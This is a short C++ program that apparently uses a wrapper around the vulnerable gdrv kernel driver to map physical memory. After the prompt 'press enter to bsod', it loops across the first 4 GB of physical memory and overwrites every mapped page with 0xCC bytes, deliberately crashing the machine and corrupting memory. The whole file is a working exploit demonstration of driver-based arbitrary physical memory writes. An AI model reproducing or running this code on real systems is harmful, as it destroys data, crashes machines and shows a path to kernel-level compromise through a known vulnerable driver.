#include "driver/simplegdrv.hpp"
#include <memory>

int main ( )
{
	const auto gdrv = std::make_unique<simplegdrv>( );

	//example taken from secure auth writeup on gdrv

	std::cout << "press enter to bsod" << std::endl;
	std::getchar( );

	
	for ( unsigned int i = 0; i < 0xffffffff; i += 0x1000 )
	{
		const ULONG64 mappedVA = gdrv->map_physical( i , 0x100 );
		*reinterpret_cast<ULONG64*>( mappedVA ) = 0xCCCCCCCCCCCCCCCC;
		gdrv->unmap_physical( i );
	}
}